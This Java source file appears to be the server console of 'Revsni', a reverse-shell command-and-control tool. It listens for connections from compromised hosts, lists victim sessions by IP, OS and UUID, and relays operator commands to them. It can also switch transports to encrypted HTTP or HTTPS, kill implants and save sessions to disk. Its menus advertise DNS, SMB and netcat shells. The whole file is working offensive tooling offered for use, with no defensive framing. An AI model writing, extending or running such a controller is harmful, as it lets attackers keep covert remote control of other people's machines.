package com.revsni.server;


import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.security.NoSuchAlgorithmException;
import java.security.spec.InvalidKeySpecException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;
import java.util.Map.Entry;
import java.util.concurrent.ConcurrentHashMap;

import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;

import com.revsni.Revsni;
import com.revsni.common.Configuration;
import com.revsni.common.Sessionerino;
import com.revsni.common.Configuration.Mode;
import com.revsni.server.http.HTTPShell;
import com.revsni.server.https.HTTPSShell;
import com.revsni.server.tcp.Listener;
import com.revsni.utils.CouplePair;
import com.revsni.utils.ThreadMonitor;
import com.revsni.utils.Triplet;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.passay.CharacterRule;
import org.passay.EnglishCharacterData;
import org.passay.CharacterData;
import org.passay.PasswordGenerator;

import com.fasterxml.jackson.annotation.PropertyAccessor;
import com.fasterxml.jackson.annotation.JsonAutoDetect.Visibility;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;




public class Server implements Runnable{
    //Shell and Network stuff
    
    private volatile boolean running;
    private volatile int port;
    //private volatile int portIn;
    private volatile SecretKey key;
    private volatile IvParameterSpec iv;
    //private Configuration configuration;
    private volatile boolean first = true;
    private volatile boolean firstOp = true;
    private volatile Updater updater;
    private volatile HTTPShell httpShell;
    private volatile HTTPSShell httpsShell;
    private volatile Listener listener;
    public volatile ThreadMonitor threadMonitor;

    //Sessions
    public volatile int sessionNumber;
    public volatile int sessionNumberStart;
    public volatile ArrayList<Triplet<Mode, Integer, String>> modePortUUID = new ArrayList<>();
    public volatile ArrayList<CouplePair<String, String>> ipOs = new ArrayList<>();
    public volatile ConcurrentHashMap<Integer, Interaction> sessionHandlers = new ConcurrentHashMap<>();

    //Helper Lists and Maps for Sessions
    public volatile ArrayList<String> ips = new ArrayList<>();
    public static HashMap<Integer, String> sessionNumOsStatic = new HashMap<>();
    public HashMap<Integer, String> sessionNumOs = sessionNumOsStatic;
    public static HashMap<Integer, String> sessNumUUIDSatic = new HashMap<>();
    public HashMap<Integer, String> sessNumUUID = sessNumUUIDSatic;
    public static HashMap<Integer, String> sessIpSt = new HashMap<>();
    public HashMap<Integer, String> sessIp = sessIpSt;



    Logger logger = LogManager.getLogger(getClass());
    private static final Logger loggerS = LogManager.getLogger(Server.class);



    public Server(String ip, int port, String pass, String salt, ThreadMonitor monitor, int sessionNumber, boolean loaded) throws NoSuchAlgorithmException, InvalidKeySpecException, IOException {
        this.sessionNumber = sessionNumber;
        this.sessionNumberStart = sessionNumber;
        
        this.threadMonitor = monitor;

        if(!loaded) {
            initServer(ip, port, pass, salt);
        } else {
            first = false;
        }
        


    }

    public boolean initServer(String ip, int port, String password, String saltForPass) {
        //setMode(sessionNumber, Mode.TCP);
        this.port = port;
        //this.ip = ip;
        //this.pass = password;
        //this.salt = saltForPass;

        updater = new Updater(ip, port, password, saltForPass);

        try {
            this.key = updater.generateKey();
            //this.key = updater.generateKeyRandom(128);
        } catch (NoSuchAlgorithmException | InvalidKeySpecException e1) {
            e1.printStackTrace();
            return false;
        }
        this.iv = updater.generateIv();

        updater.setKey(key);
        updater.setIv(iv);

        updater.generateOutputString();
        try {
            if(updater.writeOut()) {
                logger.debug("File output.txt wrote!");
                return true;
            } else {
                return false;
            }
        } catch (IOException e) {
            e.printStackTrace();
            return false;
        }
    }

    //Creates Initial Listener on TCP and handles Console Input from User as well as the interaction with different Types of Shells like TCP, HTTP etc.
    @Override
    public void run() {
        if(!isRunning() && first) {
            listener = new Listener(this, sessionNumber);
            Thread listenerThread = new Thread(listener);
            listenerThread.start();
        }
        while(isRunning()) {
            try {
                String message;
                do {
                    if(firstOp) { System.out.println("Listener started!"); logger.info("Enter 'help' if you dont know what to do.\n\nListening...\n");}
                    firstOp = false;

                    InputStreamReader inputStreamReader = new InputStreamReader(System.in);
                    BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
                    
                    message = bufferedReader.readLine();

                    switch(message) {
                        case("help"): printHelp(); break;
                        case("usage"): printUsage(); break;
                        case("configure"): printConfigure(); break;
                        case("switch"): 
                            printSwitch();
                            System.out.println("---Enter anything else to leave this menu.---\n");
                            printIn();
                            String tmp = bufferedReader.readLine();
                            switch(tmp) {
                                case("http"): 
                                    System.out.print("Specify a Port on which HTTP-Server should listen on: ");
                                    int port = Integer.parseInt(bufferedReader.readLine());
                                    httpShell = new HTTPShell(key, iv, port, sessionNumber);
                                    updater.setShellType("HTTP", String.valueOf(httpShell.getPort()));
                                    updater.generateOutputString();
                                    updater.writeOut();
                                    getInteraction(sessionNumber).sendCommand("httpSw");
                                    setInteraction(sessionNumber, httpShell);
                                    setMode(sessionNumber, Mode.HTTP);
                                    logger.info("Switch done!");
                                    break;

                                case("https"): 
                                    System.out.print("Specify a Port on which HTTPS-Server should listen on: ");
                                    int portIn = Integer.parseInt(bufferedReader.readLine());
                                    httpsShell = new HTTPSShell(key, iv, portIn);
                                    httpsShell.fireUp(portIn);
                                    updater.setShellType("HTTPS", String.valueOf(getInteraction(sessionNumber).getPort()));
                                    updater.generateOutputString();
                                    updater.writeOut();
                                    getInteraction(sessionNumber).sendCommand("httpsSw");
                                    setInteraction(sessionNumber, httpsShell);
                                    setMode(sessionNumber, Mode.HTTPS);
                                    break;
                            
                                default:
                                    break;
                            } 
                            break;
                        case("mode"): printMode(); break;
                        case("kill"): getInteraction(sessionNumber).sendCommand("kill"); getInteraction(sessionNumber).sendCommand("exit"); break;
                        case("exit"): Revsni.setActive(false); return;
                        case("encryption"): printEncryption(); break;
                        case("bg"):
                            Revsni.setActiveHelper(true); 
                            synchronized(threadMonitor) {
                                try {
                                    threadMonitor.wait();
                                } catch(InterruptedException e) {

                                }
                            }
                            printIn();
                            break;  
                            
                        case("sessions"):
                            printSessions();

                            System.out.print("Which session you want to interact with? (type 'none' to exit): ");
                            sessionNumber = Integer.parseInt(bufferedReader.readLine());
                            printIn();
                            message = "whoami";
                            break;
                            
                        default: 
                            if(getMode(sessionNumber).toString().equals("TCP")) {
                                getInteraction(sessionNumber).sendCommand(message);
                            }
                            if(getMode(sessionNumber).toString().equals("HTTP")) {
                                sessionHandlers.get(sessionNumber).sendCommand(message);
                                //httpShell.sendCommand(message);
                            }
                            if(getMode(sessionNumber).toString().equals("HTTPS")) {
                                sessionHandlers.get(sessionNumber).sendCommand(message);
                            }
                            
                    }
                } 
                while(!message.equals("quit"));
            } catch (IOException e) {

                e.printStackTrace(); 
            }
            finally {
                setRunning(false);
                logger.info("Server is shutting down");
                try {
                    listener.stopListening();
                    Thread.sleep(10000);
                }
                catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
    }



    //Pass and Salt gen
    public static String generatePassOrSalt() {
        PasswordGenerator gen = new PasswordGenerator();
        CharacterData lowerCaseChars = EnglishCharacterData.LowerCase;
        CharacterRule lowerCaseRule = new CharacterRule(lowerCaseChars);
        lowerCaseRule.setNumberOfCharacters(2);
    
        CharacterData upperCaseChars = EnglishCharacterData.UpperCase;
        CharacterRule upperCaseRule = new CharacterRule(upperCaseChars);
        upperCaseRule.setNumberOfCharacters(2);
    
        CharacterData digitChars = EnglishCharacterData.Digit;
        CharacterRule digitRule = new CharacterRule(digitChars);
        digitRule.setNumberOfCharacters(2);
        
        CharacterData specialChars = new org.passay.CharacterData() {
            public String getErrorCode() {
                return "Error while generating special chars for pass/salt!";
            }
    
            public String getCharacters() {
                return "!@#$%^&*()_+";
            }
        };
        CharacterRule splCharRule = new CharacterRule(specialChars);
        splCharRule.setNumberOfCharacters(2);
    
        String password = gen.generatePassword(10, splCharRule, lowerCaseRule, 
          upperCaseRule, digitRule);
        return password;
    }

    //Getter and Setter

    public synchronized boolean isRunning() {
        return running;
    }

    public synchronized void setRunning(boolean running) {
        this.running = running;
    }

    public synchronized int getPort() {
        return this.port;
    }

    public void setPort(int port) {
        this.port = port;
    }
    public SecretKey getKey() {
        return this.key;
    }
    public IvParameterSpec getIv() {
        return this.iv;
    }

    public void setConfig(Configuration config) {
        //this.configuration = config;

        //Implement applying config to TCP, HTTP, HTTPS and stuff.
    }


    //Session handling

    public static void addSession(String uuid, String os, int sessionNumber) {
        loggerS.info("Added Session Nr. " + sessionNumber + " to the session list!");
        sessionNumOsStatic.put(sessionNumber, os);
        sessNumUUIDSatic.put(sessionNumber, uuid);
 
    }

    public void addSession(String ip, int port, Interaction handler, int sessionNumber ) {
        sessionHandlers.put(sessionNumber, handler);
        sessIpSt.put(sessionNumber, ip);
        
        //handlerinos.put(sessionNumber, handler);
    }

    public void removeSession(int sessionNumber) {
        sessionHandlers.remove(sessionNumber);
        modePortUUID.remove(sessionNumber - sessionNumberStart);
        ipOs.remove(sessionNumber - sessionNumberStart);
    }

    public Interaction getInteraction(int sessionNumber) {
        logger.info("Getting interaction for sessioNumber: " + sessionNumber);
        logger.info("Type is: " + sessionHandlers.get(sessionNumber).getMode().toString());
        return sessionHandlers.get(sessionNumber);
    }

    public String getIp(int sessioNumber) {
        return sessIp.get(sessioNumber);
    }

    public Mode getMode(int sessionNumber) {
        Mode ret = null;
        int sess = sessionNumber - sessionNumberStart;
        ret = modePortUUID.get(sess).getKey();

        return ret;
    }

    public void setMode(int sessionNumber, Mode mode) {
        int sess = sessionNumber - sessionNumberStart;
        Triplet<Mode, Integer, String> trip = new Triplet<Configuration.Mode,Integer,String>(mode, modePortUUID.get(sess).getValue(), modePortUUID.get(sess).getAddition());
        modePortUUID.set(sess, trip);
    }

    public void addToPrint(int sessNr) {
        String tmpIp = getIp(sessNr);
        int tmpPort = getInteraction(sessNr).getPort();
        Mode tmpMode = getInteraction(sessNr).getMode();
        String tmpUUID = sessNumUUID.get(sessNr);
        String tmpOs = sessionNumOs.get(sessNr);

        ipOs.add(new CouplePair<String,String>(tmpIp, tmpOs));
        modePortUUID.add(new Triplet<Mode, Integer, String>(tmpMode, tmpPort, tmpUUID));
        printIn();
    }

    public void setInteraction(int sessioNumber, Interaction interaction) {
        if(sessionHandlers.get(sessioNumber) == null) {
            sessionHandlers.put(sessioNumber, interaction);
        }
        sessionHandlers.replace(sessioNumber, interaction);
    }

    public void printIn() {
        System.out.print("Revsn [" + getMode(sessionNumber).toString() + "]["+ getIp(sessionNumber) +"]["+sessionNumber+"]» ");
    }


    public void printSessions() {
        int i = 0;
        System.out.println("---|Session List|---\n|Session Nr.\t|IP\t\t|OS\t|Mode\t|UUID\t\t\t\t\t|");
        for(Integer sess : sessionNumOs.keySet()) {
            System.out.println(
                "|" + sess + "\t\t" +
                "|" + ipOs.get(i).getKey() + "\t" +
                "|" + ipOs.get(i).getValue() + "\t" +
                "|" + modePortUUID.get(i).getKey() + "\t" +
                "|" + modePortUUID.get(i).getAddition() + "\t" +
                "|\n");
            i++;
        }
    }

    public void saveSessions(String filename) {
        ObjectMapper mapperino = new ObjectMapper();
        File sessionFile = new File(filename + ".json");
        mapperino.setVisibility(PropertyAccessor.FIELD, Visibility.ANY);
        mapperino.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false);
        Sessionerino sessionerino = new Sessionerino(sessionNumberStart, modePortUUID, ipOs, null);
        try {
            mapperino.writeValue(sessionFile, sessionerino);
            System.out.println("Successfully saved sessions to: '"+filename+".json'!");
        } catch(IOException e) {
            e.printStackTrace();
            logger.error("FAILED TO SAVE SESSIONS TO FILE!");
        }
    }
    public void saveSessions() {
        ObjectMapper mapperino = new ObjectMapper();
        File sessionFile = new File("sessions.json");
        mapperino.setVisibility(PropertyAccessor.FIELD, Visibility.ANY);
        mapperino.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false);
        Sessionerino sessionerino = new Sessionerino(sessionNumberStart, modePortUUID, ipOs, null);
        try {
            mapperino.writeValue(sessionFile, sessionerino);
            System.out.println("Successfully saved sessions to 'sessions.json'!");
        } catch(IOException e) {
            e.printStackTrace();
            logger.error("FAILED TO SAVE SESSIONS TO FILE!");
        }
    }

    public boolean loadSessions(String filename) {
        ObjectMapper mapperino = new ObjectMapper();
        mapperino.setVisibility(PropertyAccessor.FIELD, Visibility.ANY);
        File sessionFile = new File(filename + ".json");
        try {
            Sessionerino sessionerino = mapperino.readValue(sessionFile, Sessionerino.class);
            sessionNumberStart = sessionerino.getSessionNumberStart();
            modePortUUID = sessionerino.getModePortUUID();
            ipOs = sessionerino.getIpOs();
            System.out.println("Successfully loaded sessions from: '"+filename+".json'!");
            return true;
        } catch(IOException e) {
            e.printStackTrace();
            logger.error("FAILED TO LOAD SESSIONS FROM FILE!");
            return false;
        }
    }
    public boolean loadSessions() {
        ObjectMapper mapperino = new ObjectMapper();
        mapperino.setVisibility(PropertyAccessor.FIELD, Visibility.ANY);
        File sessionFile = new File("sessions.json");
        try {
            Sessionerino sessionerino = mapperino.readValue(sessionFile, Sessionerino.class);
            sessionNumberStart = sessionerino.getSessionNumberStart();
            modePortUUID = sessionerino.getModePortUUID();
            ipOs = sessionerino.getIpOs();
            System.out.println("Successfully loaded sessions from: 'sessions.json'!");
            return true;
        } catch(IOException e) {
            e.printStackTrace();
            logger.error("FAILED TO LOAD SESSIONS FROM FILE!");
            return false;
        }
    }

    public void updateLoadedSessionsForHandlers(String uuid, Interaction interaction) {
        for(Triplet<Mode, Integer, String> tip : modePortUUID) {
            if(tip.getAddition().equals(uuid)) {
                int sessId = modePortUUID.indexOf(tip) + sessionNumberStart;
                sessionHandlers.replace(sessId, interaction);
            }
        }
    }


    //Useful

    public <T, E> T getKeyByValue(Map<T, E> map, E value) {
        for (Entry<T, E> entry : map.entrySet()) {
            if (Objects.equals(value, entry.getValue())) {
                return entry.getKey();
            }
        }
        return null;
    }


    //Menus

    private void printHelp() {
        System.out.println("\n"
                          +"-----------"
                          +"|Help Menu|"
                          +"-----------"
                          +"\n"
                          +"mode        -   Use netcat for example\n"
                          +"commands    -   Show Revsn specific commands\n"
                          +"encryption  -   Change between different encryptions or combine them\n"
                          +"switch      -   Switch Shell\n"
                          +"configure   -   Configure Revsn\n"
                          +"bg          -   Background Session\n"
                          +"quit        -   Closes connection\n"
                          +"\n");
    }

    private void printMode() {
        System.out.println("\n"
                          +"-----------"
                          +"|Mode Menu|"
                          +"-----------"
                          +"\n"
                          +"vanilla     -   Use Revsni Java Interface\n"
                          +"safe        -   Use predefined Commands\n"
                          +"nc          -   Use netcat\n"
                          +"ps          -   Use Powershell (Windows only!)\n"
                          +"\n");
    }

    private void printConfigure() {
        System.out.println("\n"
                          +"-----------"
                          +"|Configuration Menu|"
                          +"-----------"
                          +"\n"
                          +"charset     -   Configure used charset for compatibility\n"
                          +"shells      -   Configure Parameters of different Shells\n"
                          +"\n");
    }

    private void printSwitch() {
        System.out.println("\n"
                          +"-----------"
                          +"|Shell Menu|"
                          +"-----------"
                          +"\n"
                          +"udp         -   Change to UDP Shell\n"
                          +"http        -   Change to HTTP Shell\n"
                          +"https       -   Change to HTTPS Shell\n"
                          +"httpas      -   Change to Asynchronous HTTP Shell\n"
                          +"httpsas     -   Change to Asynchronous HTTPS Shell\n"
                          +"dns         -   Change to DNS Reverse Shell\n"
                          +"smb         -   Change to SMB Shell (mostly Windows only, run detection first!)\n"
                          +"ssdp/upnp   -   Change to SSDP/UPNP Shell through UDP\n"
                          +"\n");
    }

    private void printEncryption() {
        System.out.println("\n"
                          +"-----------"
                          +"|Encryption Menu|"
                          +"-----------"
                          +"\n"
                          +"AES         -   AES in CBC mode\n"
                          +"RSA         -   Well, seems like RSA\n"
                          +"Triple DES  -   Used for example to encrypt UNIX password and ATM pins\n"
                          +"Blowfish    -   Blow da fish Kanye\n"
                          +"Twofish     -   u know Kanye\n"
                          +"Serpent     -   Is it a Python?!\n"
                          +"\n");
    }

    private static void printUsage() {
        System.out.println("\n"
                          +"-----------"
                          +"|Usage|"
                          +"-----------"
                          +"\n"
                          +"For now Revsni needs AES for initial connection\n you don't have to specify a password\n  nor a salt\n   but they will be generated and saved into a file called output.txt!\n"
                          +"\nMinimal:\n\tjava -jar server.jar <Server-IP> <Server-Port>\n"
                          +"\nRecommendend:\n\tjava -jar server.jar <Server-IP> <Server-Port> <Password> <Salt>\n"
                          +"\nIt's okay to not specify a salt as it will be generated anyways. :) \n"
                          +"\n");
    }

    private void printCommands() {

    }

}